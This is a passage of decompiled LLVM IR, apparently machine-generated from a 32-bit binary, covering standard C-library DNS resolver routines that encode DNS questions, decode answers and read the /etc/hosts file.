  uselistorder i32 11, { 6, 7, 9, 8, 5, 3, 10, 0, 1, 11, 12, 13, 14, 15, 2, 4 }
  uselistorder i32 40, { 1, 2, 5, 4, 3, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 7, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 5, { 15, 16, 9, 10, 11, 3, 4, 12, 5, 13, 14, 2, 1, 17, 18, 6, 7, 0, 8 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 28, { 9, 10, 11, 12, 2, 3, 6, 13, 21, 33, 17, 0, 18, 19, 20, 4, 5, 22, 8, 7, 14, 15, 23, 24, 25, 26, 27, 28, 31, 29, 30, 1, 32, 34, 16 }
  uselistorder i32 29, { 6, 0, 1, 16, 17, 14, 15, 11, 12, 7, 8, 13, 2, 9, 3, 10, 20, 21, 18, 19, 4, 5 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000a51c = load i32, i32* %arg1, align 4
  store i32 %v2_1000a51c, i32* %r3.global-to-local, align 4
  store i32 268477732, i32* @lr, align 4
  %v1_1000a520 = inttoptr i32 %v2_1000a51c to i8*
  %v2_1000a520 = call i32 @__encode_dotted(i8* %v1_1000a520)
  store i32 %v2_1000a520, i32* %r3.global-to-local, align 4
  %v1_1000a524 = icmp slt i32 %v2_1000a520, 0
  %v1_1000a528 = load i32, i32* @r29, align 4
  %v2_1000a528 = sub i32 %v1_1000a528, %v2_1000a520
  store i32 %v2_1000a528, i32* @r29, align 4
  br i1 %v1_1000a524, label %dec_label_pc_1000a568, label %dec_label_pc_1000a534

dec_label_pc_1000a534:                            ; preds = %entry
  %v2_1000a52c = icmp sgt i32 %v2_1000a528, 3
  %v0_1000a534 = load i32, i32* @r30, align 4
  %v2_1000a534 = add i32 %v0_1000a534, %v2_1000a520
  store i32 %v2_1000a534, i32* %r9.global-to-local, align 4
  br i1 %v2_1000a52c, label %dec_label_pc_1000a544, label %dec_label_pc_1000a53c

dec_label_pc_1000a53c:                            ; preds = %dec_label_pc_1000a534
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a568

dec_label_pc_1000a544:                            ; preds = %dec_label_pc_1000a534
  %v0_1000a544 = load i32, i32* @r31, align 4
  %v1_1000a544 = add i32 %v0_1000a544, 6
  %v2_1000a544 = inttoptr i32 %v1_1000a544 to i8*
  %v3_1000a544 = load i8, i8* %v2_1000a544, align 1
  %v5_1000a548 = inttoptr i32 %v2_1000a534 to i8*
  store i8 %v3_1000a544, i8* %v5_1000a548, align 1
  %v0_1000a54c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a54c = add i32 %v0_1000a54c, 4
  store i32 %v1_1000a54c, i32* %r3.global-to-local, align 4
  %v0_1000a550 = load i32, i32* @r31, align 4
  %v1_1000a550 = add i32 %v0_1000a550, 4
  %v2_1000a550 = inttoptr i32 %v1_1000a550 to i32*
  %v3_1000a550 = load i32, i32* %v2_1000a550, align 4
  %v1_1000a554 = trunc i32 %v3_1000a550 to i8
  %v2_1000a554 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a554 = add i32 %v2_1000a554, 1
  %v4_1000a554 = inttoptr i32 %v3_1000a554 to i8*
  store i8 %v1_1000a554, i8* %v4_1000a554, align 1
  %v0_1000a558 = load i32, i32* @r31, align 4
  %v1_1000a558 = add i32 %v0_1000a558, 10
  %v2_1000a558 = inttoptr i32 %v1_1000a558 to i8*
  %v3_1000a558 = load i8, i8* %v2_1000a558, align 1
  %v2_1000a55c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a55c = add i32 %v2_1000a55c, 2
  %v4_1000a55c = inttoptr i32 %v3_1000a55c to i8*
  store i8 %v3_1000a558, i8* %v4_1000a55c, align 1
  %v0_1000a560 = load i32, i32* @r31, align 4
  %v1_1000a560 = add i32 %v0_1000a560, 8
  %v2_1000a560 = inttoptr i32 %v1_1000a560 to i32*
  %v3_1000a560 = load i32, i32* %v2_1000a560, align 4
  %v1_1000a564 = trunc i32 %v3_1000a560 to i8
  %v2_1000a564 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a564 = add i32 %v2_1000a564, 3
  %v4_1000a564 = inttoptr i32 %v3_1000a564 to i8*
  store i8 %v1_1000a564, i8* %v4_1000a564, align 1
  %v0_1000a578.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a568

dec_label_pc_1000a568:                            ; preds = %entry, %dec_label_pc_1000a53c, %dec_label_pc_1000a544
  %v0_1000a578 = phi i32 [ %v2_1000a520, %entry ], [ -1, %dec_label_pc_1000a53c ], [ %v0_1000a578.pre, %dec_label_pc_1000a544 ]
  ret i32 %v0_1000a578

; uselistorder directives
  uselistorder i32 %v2_1000a520, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000a568, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268477836, i32* @lr, align 4
  %v0_1000a588 = call i32 @__length_dotted()
  %v1_1000a58c = icmp slt i32 %v0_1000a588, 0
  br i1 %v1_1000a58c, label %dec_label_pc_1000a598, label %dec_label_pc_1000a594

dec_label_pc_1000a594:                            ; preds = %entry
  %v1_1000a594 = add i32 %v0_1000a588, 4
  br label %dec_label_pc_1000a598

dec_label_pc_1000a598:                            ; preds = %entry, %dec_label_pc_1000a594
  %v0_1000a5a4 = phi i32 [ %v0_1000a588, %entry ], [ %v1_1000a594, %dec_label_pc_1000a594 ]
  ret i32 %v0_1000a5a4

; uselistorder directives
  uselistorder label %dec_label_pc_1000a598, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000a5ac = load i32, i32* @lr, align 4
  store i32 %v0_1000a5ac, i32* %r0.global-to-local, align 4
  %v2_1000a5b4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000a5b4, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v2_1000a5b4, i32* %r5.global-to-local, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268477912, i32* @lr, align 4
  %v2_1000a5d4 = call i32 @__decode_dotted(i32 %v2_1000a5b4, i32 256)
  store i32 %v2_1000a5d4, i32* @r27, align 4
  %v1_1000a5d8 = icmp slt i32 %v2_1000a5d4, 0
  %v0_1000a5dc = load i32, i32* @r28, align 4
  %v2_1000a5dc = add i32 %v0_1000a5dc, %v2_1000a5d4
  store i32 %v2_1000a5dc, i32* @r28, align 4
  %v1_1000a5e0 = load i32, i32* @r29, align 4
  %v2_1000a5e0 = sub i32 %v1_1000a5e0, %v2_1000a5dc
  %v1_1000a5e4 = add i32 %v2_1000a5e0, -10
  br i1 %v1_1000a5d8, label %dec_label_pc_1000a6a0, label %dec_label_pc_1000a5f0

dec_label_pc_1000a5f0:                            ; preds = %entry
  %v0_1000a5f4 = load i32, i32* @r26, align 4
  %v2_1000a5f4 = add i32 %v0_1000a5f4, %v2_1000a5dc
  store i32 %v2_1000a5f4, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_1000a5e4, -1
  br i1 %tmp6, label %dec_label_pc_1000a604, label %dec_label_pc_1000a5fc

dec_label_pc_1000a5fc:                            ; preds = %dec_label_pc_1000a5f0
  store i32 %v1_1000a5e4, i32* @r27, align 4
  br label %dec_label_pc_1000a6a0

dec_label_pc_1000a604:                            ; preds = %dec_label_pc_1000a5f0
  store i32 268477960, i32* @lr, align 4
  %v1_1000a604 = call i32 @__GI_strdup(i32 %v2_1000a5b4)
  %v0_1000a608 = load i32, i32* @r30, align 4
  %v1_1000a608 = add i32 %v0_1000a608, 2
  store i32 %v1_1000a608, i32* %r8.global-to-local, align 4
  %v1_1000a60c = load i32, i32* @r31, align 4
  %v2_1000a60c = inttoptr i32 %v1_1000a60c to i32*
  store i32 %v1_1000a604, i32* %v2_1000a60c, align 4
  %v0_1000a610 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a610 = add i32 %v0_1000a610, 2
  store i32 %v1_1000a610, i32* %r10.global-to-local, align 4
  %v0_1000a614 = load i32, i32* @r30, align 4
  %v1_1000a614 = add i32 %v0_1000a614, 10
  store i32 %v1_1000a614, i32* %r5.global-to-local, align 4
  %v0_1000a618 = load i32, i32* @r28, align 4
  %v1_1000a618 = add i32 %v0_1000a618, 10
  store i32 %v1_1000a618, i32* %r6.global-to-local, align 4
  %v0_1000a61c = load i32, i32* @r26, align 4
  %v2_1000a61c = add i32 %v0_1000a61c, %v0_1000a618
  %v3_1000a61c = inttoptr i32 %v2_1000a61c to i8*
  %v4_1000a61c = load i8, i8* %v3_1000a61c, align 1
  %v5_1000a61c = zext i8 %v4_1000a61c to i32
  store i32 %v5_1000a61c, i32* %r0.global-to-local, align 4
  %v1_1000a620 = add i32 %v0_1000a614, 1
  %v2_1000a620 = inttoptr i32 %v1_1000a620 to i8*
  %v3_1000a620 = load i8, i8* %v2_1000a620, align 1
  %v4_1000a620 = zext i8 %v3_1000a620 to i32
  store i32 %v4_1000a620, i32* %r9.global-to-local, align 4
  %v1_1000a624 = mul nuw nsw i32 %v5_1000a61c, 256
  %v2_1000a628 = or i32 %v4_1000a620, %v1_1000a624
  store i32 %v2_1000a628, i32* %r0.global-to-local, align 4
  %v1_1000a62c = load i32, i32* @r31, align 4
  %v2_1000a62c = add i32 %v1_1000a62c, 4
  %v3_1000a62c = inttoptr i32 %v2_1000a62c to i32*
  store i32 %v2_1000a628, i32* %v3_1000a62c, align 4
  %v0_1000a630 = load i32, i32* @r30, align 4
  %v1_1000a630 = add i32 %v0_1000a630, 2
  %v2_1000a630 = inttoptr i32 %v1_1000a630 to i8*
  %v3_1000a630 = load i8, i8* %v2_1000a630, align 1
  %v4_1000a630 = zext i8 %v3_1000a630 to i32
  store i32 %v4_1000a630, i32* %r0.global-to-local, align 4
  %v0_1000a634 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a634 = add i32 %v0_1000a634, 1
  %v2_1000a634 = inttoptr i32 %v1_1000a634 to i8*
  %v3_1000a634 = load i8, i8* %v2_1000a634, align 1
  %v4_1000a634 = zext i8 %v3_1000a634 to i32
  store i32 %v4_1000a634, i32* %r9.global-to-local, align 4
  %v1_1000a638 = mul nuw nsw i32 %v4_1000a630, 256
  %v2_1000a63c = or i32 %v4_1000a634, %v1_1000a638
  store i32 %v2_1000a63c, i32* %r0.global-to-local, align 4
  %v1_1000a640 = load i32, i32* @r31, align 4
  %v2_1000a640 = add i32 %v1_1000a640, 8
  %v3_1000a640 = inttoptr i32 %v2_1000a640 to i32*
  store i32 %v2_1000a63c, i32* %v3_1000a640, align 4
  %v0_1000a644 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a644 = add i32 %v0_1000a644, 2
  %v2_1000a644 = inttoptr i32 %v1_1000a644 to i8*
  %v3_1000a644 = load i8, i8* %v2_1000a644, align 1
  %v4_1000a644 = zext i8 %v3_1000a644 to i32
  store i32 %v4_1000a644, i32* %r0.global-to-local, align 4
  %v0_1000a648 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a648 = add i32 %v0_1000a648, 1
  %v2_1000a648 = inttoptr i32 %v1_1000a648 to i8*
  %v3_1000a648 = load i8, i8* %v2_1000a648, align 1
  %v4_1000a648 = zext i8 %v3_1000a648 to i32
  %v1_1000a64c = add i32 %v0_1000a648, 3
  %v2_1000a64c = inttoptr i32 %v1_1000a64c to i8*
  %v3_1000a64c = load i8, i8* %v2_1000a64c, align 1
  %v4_1000a64c = zext i8 %v3_1000a64c to i32
  %v1_1000a650 = add i32 %v0_1000a648, 2
  %v2_1000a650 = inttoptr i32 %v1_1000a650 to i8*
  %v3_1000a650 = load i8, i8* %v2_1000a650, align 1
  %v4_1000a650 = zext i8 %v3_1000a650 to i32
  %v1_1000a654 = mul nuw i32 %v4_1000a644, 16777216
  %v1_1000a658 = mul nuw nsw i32 %v4_1000a648, 65536
  %v2_1000a65c = or i32 %v1_1000a658, %v1_1000a654
  %v2_1000a660 = or i32 %v2_1000a65c, %v4_1000a64c
  store i32 %v2_1000a660, i32* %r0.global-to-local, align 4
  %v1_1000a664 = mul nuw nsw i32 %v4_1000a650, 256
  %v2_1000a668 = or i32 %v1_1000a664, %v2_1000a660
  store i32 %v2_1000a668, i32* %r9.global-to-local, align 4
  %v1_1000a66c = load i32, i32* @r31, align 4
  %v2_1000a66c = add i32 %v1_1000a66c, 12
  %v3_1000a66c = inttoptr i32 %v2_1000a66c to i32*
  store i32 %v2_1000a668, i32* %v3_1000a66c, align 4
  %v0_1000a670 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a670 = add i32 %v0_1000a670, 6
  %v2_1000a670 = inttoptr i32 %v1_1000a670 to i8*
  %v3_1000a670 = load i8, i8* %v2_1000a670, align 1
  %v4_1000a670 = zext i8 %v3_1000a670 to i32
  store i32 %v4_1000a670, i32* %r9.global-to-local, align 4
  %v0_1000a674 = load i32, i32* @r30, align 4
  %v1_1000a674 = add i32 %v0_1000a674, 9
  %v2_1000a674 = inttoptr i32 %v1_1000a674 to i8*
  %v3_1000a674 = load i8, i8* %v2_1000a674, align 1
  %v4_1000a674 = zext i8 %v3_1000a674 to i32
  store i32 %v4_1000a674, i32* %r0.global-to-local, align 4
  %v0_1000a678 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a678 = load i32, i32* @r31, align 4
  %v2_1000a678 = add i32 %v1_1000a678, 24
  %v3_1000a678 = inttoptr i32 %v2_1000a678 to i32*
  store i32 %v0_1000a678, i32* %v3_1000a678, align 4
  %v0_1000a67c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a67c = mul i32 %v0_1000a67c, 256
  store i32 %v1_1000a67c, i32* %r9.global-to-local, align 4
  %v0_1000a680 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a680 = load i32, i32* @r31, align 4
  %v2_1000a680 = add i32 %v1_1000a680, 20
  %v3_1000a680 = inttoptr i32 %v2_1000a680 to i32*
  store i32 %v0_1000a680, i32* %v3_1000a680, align 4
  %v0_1000a684 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a684 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a684 = or i32 %v1_1000a684, %v0_1000a684
  store i32 %v2_1000a684, i32* %r9.global-to-local, align 4
  %v0_1000a688 = load i32, i32* @r29, align 4
  %v2_1000a688 = icmp slt i32 %v0_1000a688, %v2_1000a684
  %v1_1000a68c = add i32 %v2_1000a684, 10
  store i32 %v1_1000a68c, i32* %r0.global-to-local, align 4
  %v0_1000a690 = load i32, i32* @r27, align 4
  %v2_1000a690 = add i32 %v0_1000a690, %v1_1000a68c
  store i32 %v2_1000a690, i32* @r27, align 4
  %v1_1000a694 = load i32, i32* @r31, align 4
  %v2_1000a694 = add i32 %v1_1000a694, 16
  %v3_1000a694 = inttoptr i32 %v2_1000a694 to i32*
  store i32 %v2_1000a684, i32* %v3_1000a694, align 4
  br i1 %v2_1000a688, label %dec_label_pc_1000a69c, label %dec_label_pc_1000a604.dec_label_pc_1000a6a0_crit_edge

dec_label_pc_1000a604.dec_label_pc_1000a6a0_crit_edge: ; preds = %dec_label_pc_1000a604
  %v0_1000a6a4.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000a6a0

dec_label_pc_1000a69c:                            ; preds = %dec_label_pc_1000a604
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000a6a0

dec_label_pc_1000a6a0:                            ; preds = %dec_label_pc_1000a604.dec_label_pc_1000a6a0_crit_edge, %entry, %dec_label_pc_1000a5fc, %dec_label_pc_1000a69c
  %v0_1000a6a4 = phi i32 [ %v0_1000a6a4.pre, %dec_label_pc_1000a604.dec_label_pc_1000a6a0_crit_edge ], [ %v2_1000a5d4, %entry ], [ %v1_1000a5e4, %dec_label_pc_1000a5fc ], [ -1, %dec_label_pc_1000a69c ]
  store i32 %v0_1000a5ac, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a6a4

; uselistorder directives
  uselistorder i32 %v2_1000a684, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a5e4, { 1, 2, 0 }
  uselistorder i32 %v2_1000a5d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000a5b4, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 20, { 9, 10, 11, 12, 3, 16, 13, 14, 17, 18, 19, 20, 5, 6, 8, 7, 0, 30, 31, 21, 22, 23, 24, 25, 27, 28, 26, 29, 15, 1, 2, 4 }
  uselistorder i32 9, { 9, 10, 11, 12, 2, 13, 3, 14, 4, 15, 0, 16, 17, 18, 5, 19, 20, 1, 6, 7, 8 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a6a0, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1000a6bc = load i32, i32* @lr, align 4
  store i32 268478176, i32* @lr, align 4
  %v3_1000a6dc = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1000d030.482 to i32), i32 ptrtoint (i32* @global_var_1000cfcc.450 to i32))
  %v3_1000a6e4 = icmp eq i32 %v3_1000a6dc, 0
  br i1 %v3_1000a6e4, label %dec_label_pc_1000a6ec, label %dec_label_pc_1000a708

dec_label_pc_1000a6ec:                            ; preds = %entry
  %v0_1000a6e0 = load i32, i32* @r29, align 4
  store i32 %v0_1000a6bc, i32* @lr, align 4
  %v3_1000a704 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1000d03c.483 to i32), i32 %v0_1000a6e0)
  br label %dec_label_pc_1000a708

dec_label_pc_1000a708:                            ; preds = %entry, %dec_label_pc_1000a6ec
  %v0_1000a718 = phi i32 [ %v3_1000a6dc, %entry ], [ %v3_1000a704, %dec_label_pc_1000a6ec ]
  ret i32 %v0_1000a718

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_1000a708, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000a720 = load i32, i32* @lr, align 4
  %v1_1000a728 = sub i32 0, %arg6
  %v1_1000a72c = urem i32 %v1_1000a728, 4
  store i32 %v1_1000a72c, i32* %r0.global-to-local, align 4
  %v3_1000a72c = icmp eq i32 %v1_1000a72c, 0
  store i32 %arg6, i32* @r30, align 4
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000a74c = load i32, i32* @r10, align 4
  store i32 %v0_1000a74c, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000a768.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000a72c, label %dec_label_pc_1000a768, label %dec_label_pc_1000a758

dec_label_pc_1000a758:                            ; preds = %entry
  %v2_1000a758 = icmp ult i32 %v0_1000a768.pr, %v1_1000a72c
  br i1 %v2_1000a758, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a760

dec_label_pc_1000a760:                            ; preds = %dec_label_pc_1000a758
  %v2_1000a760 = sub i32 %v0_1000a768.pr, %v1_1000a72c
  store i32 %v2_1000a760, i32* %r9.global-to-local, align 4
  %v2_1000a764 = add i32 %v1_1000a72c, %arg6
  store i32 %v2_1000a764, i32* @r30, align 4
  br label %dec_label_pc_1000a768

dec_label_pc_1000a768:                            ; preds = %entry, %dec_label_pc_1000a760
  %v0_1000a774 = phi i32 [ %v2_1000a764, %dec_label_pc_1000a760 ], [ %arg6, %entry ]
  %v0_1000a778 = phi i32 [ %v2_1000a760, %dec_label_pc_1000a760 ], [ %v0_1000a768.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_1000a778, 32
  br i1 %tmp49, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a770

dec_label_pc_1000a770:                            ; preds = %dec_label_pc_1000a768
  %v3_1000a770 = icmp eq i32 %arg4, 1
  %v1_1000a774 = add i32 %v0_1000a774, 32
  store i32 %v1_1000a774, i32* @r24, align 4
  %v1_1000a778 = add i32 %v0_1000a778, -32
  store i32 %v1_1000a778, i32* @r27, align 4
  br i1 %v3_1000a770, label %dec_label_pc_1000a878, label %dec_label_pc_1000a780

dec_label_pc_1000a780:                            ; preds = %dec_label_pc_1000a770
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000a788 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000a788, align 4
  %tmp50 = icmp ult i32 %v1_1000a778, 4
  br i1 %tmp50, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a790

dec_label_pc_1000a790:                            ; preds = %dec_label_pc_1000a780
  %v0_1000a790 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a790 = add i32 %v0_1000a790, -36
  store i32 %v1_1000a790, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000a790, 8
  br i1 %tmp51, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a79c

dec_label_pc_1000a79c:                            ; preds = %dec_label_pc_1000a790
  %v0_1000a79c = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000a79c, 16
  br i1 %tmp52, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a7a4

dec_label_pc_1000a7a4:                            ; preds = %dec_label_pc_1000a79c
  %v1_1000a7a4 = add i32 %v0_1000a790, -48
  store i32 %v1_1000a7a4, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000a7a4, 8
  br i1 %tmp53, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a7b0

dec_label_pc_1000a7b0:                            ; preds = %dec_label_pc_1000a7a4
  %v1_1000a7b0 = add i32 %v0_1000a790, -56
  store i32 %v1_1000a7b0, i32* %r0.global-to-local, align 4
  %v1_1000a7b4 = add i32 %v0_1000a790, -44
  store i32 %v1_1000a7b4, i32* @r27, align 4
  %v3_1000a7b8 = icmp ugt i32 %v1_1000a7b0, %v1_1000a7b4
  %v0_1000a7bc = load i32, i32* @r30, align 4
  %v1_1000a7bc = add i32 %v0_1000a7bc, 36
  store i32 %v1_1000a7bc, i32* @r29, align 4
  %v1_1000a7c0 = add i32 %v0_1000a7bc, 48
  store i32 %v1_1000a7c0, i32* @r26, align 4
  br i1 %v3_1000a7b8, label %dec_label_pc_1000a7d4, label %dec_label_pc_1000a7cc

dec_label_pc_1000a7cc:                            ; preds = %dec_label_pc_1000a7b0
  store i32 %v1_1000a7b0, i32* @r27, align 4
  br label %dec_label_pc_1000a7d4

dec_label_pc_1000a7d4:                            ; preds = %dec_label_pc_1000a7b0, %dec_label_pc_1000a7cc
  %v0_1000a7d4 = phi i32 [ %v1_1000a7b0, %dec_label_pc_1000a7cc ], [ %v1_1000a7b4, %dec_label_pc_1000a7b0 ]
  %tmp54 = icmp ult i32 %v0_1000a7d4, 80
  br i1 %tmp54, label %dec_label_pc_1000aa1c, label %dec_label_pc_1000a7dc

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a7d4
  store i32 268478432, i32* @lr, align 4
  %v0_1000a7dc = call i32 @__open_etc_hosts()
  store i32 %v0_1000a7dc, i32* @r20, align 4
  %v3_1000a7e0 = icmp eq i32 %v0_1000a7dc, 0
  br i1 %v3_1000a7e0, label %dec_label_pc_1000a800, label %dec_label_pc_1000a7e8

dec_label_pc_1000a7e8:                            ; preds = %dec_label_pc_1000a7dc
  %v0_1000a7e8 = load i32, i32* @r24, align 4
  store i32 %v0_1000a7e8, i32* @r25, align 4
  %v0_1000a7f0 = load i32, i32* @r26, align 4
  store i32 %v0_1000a7f0, i32* @r23, align 4
  %v0_1000a7f4 = load i32, i32* @r31, align 4
  store i32 %v0_1000a7f4, i32* @r24, align 4
  store i32 %v0_1000a7e8, i32* %r21.global-to-local, align 4
  %v1_1000a890.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000a888

dec_label_pc_1000a800:                            ; preds = %dec_label_pc_1000a7dc
  %v1_1000a800 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000a800 = inttoptr i32 %v1_1000a800 to i32*
  store i32 0, i32* %v2_1000a800, align 4
  %v0_1000a804 = call i32 @__errno_location()
  %v1_1000a808 = inttoptr i32 %v0_1000a804 to i32*
  %v2_1000a808 = load i32, i32* %v1_1000a808, align 4
  store i32 %v2_1000a808, i32* @r26, align 4
  br label %dec_label_pc_1000aa20

dec_label_pc_1000a810:                            ; preds = %dec_label_pc_1000a9b0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000a814 = load i32, i32* @r25, align 4
  %v1_1000a814 = load i32, i32* @r22, align 4
  %v2_1000a814 = inttoptr i32 %v1_1000a814 to i32*
  store i32 %v0_1000a814, i32* %v2_1000a814, align 4
  %v0_1000a818 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a818 = load i32, i32* @r22, align 4
  %v2_1000a818 = add i32 %v1_1000a818, 4
  %v3_1000a818 = inttoptr i32 %v2_1000a818 to i32*
  store i32 %v0_1000a818, i32* %v3_1000a818, align 4
  %v0_1000a81c = load i32, i32* @r30, align 4
  %v1_1000a81c = add i32 %v0_1000a81c, 8
  store i32 %v1_1000a81c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000a824 = add i32 %v0_1000a81c, 4
  %v2_1000a824 = inttoptr i32 %v1_1000a824 to i32*
  %v3_1000a824 = load i32, i32* %v2_1000a824, align 4
  store i32 %v3_1000a824, i32* %r0.global-to-local, align 4
  %v0_1000a828 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000a828 = load i32, i32* @r28, align 4
  %v2_1000a828 = add i32 %v1_1000a828, 8
  %v3_1000a828 = inttoptr i32 %v2_1000a828 to i32*
  store i32 %v0_1000a828, i32* %v3_1000a828, align 4
  %v0_1000a82c = load i32, i32* @r22, align 4
  %v1_1000a82c = load i32, i32* @r28, align 4
  %v2_1000a82c = add i32 %v1_1000a82c, 16
  %v3_1000a82c = inttoptr i32 %v2_1000a82c to i32*
  store i32 %v0_1000a82c, i32* %v3_1000a82c, align 4
  %v0_1000a830 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a830 = load i32, i32* @r28, align 4
  %v2_1000a830 = inttoptr i32 %v1_1000a830 to i32*
  store i32 %v0_1000a830, i32* %v2_1000a830, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000a838 = load i32, i32* @r28, align 4
  %v2_1000a838 = add i32 %v1_1000a838, 12
  %v3_1000a838 = inttoptr i32 %v2_1000a838 to i32*
  store i32 4, i32* %v3_1000a838, align 4
  br label %dec_label_pc_1000a86c

dec_label_pc_1000a840:                            ; preds = %dec_label_pc_1000a9d4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000a844 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a844 = load i32, i32* @r23, align 4
  %v2_1000a844 = inttoptr i32 %v1_1000a844 to i32*
  store i32 %v0_1000a844, i32* %v2_1000a844, align 4
  %v0_1000a848 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a848 = load i32, i32* @r23, align 4
  %v2_1000a848 = add i32 %v1_1000a848, 4
  %v3_1000a848 = inttoptr i32 %v2_1000a848 to i32*
  store i32 %v0_1000a848, i32* %v3_1000a848, align 4
  %v0_1000a84c = load i32, i32* @r30, align 4
  %v1_1000a84c = add i32 %v0_1000a84c, 8
  store i32 %v1_1000a84c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
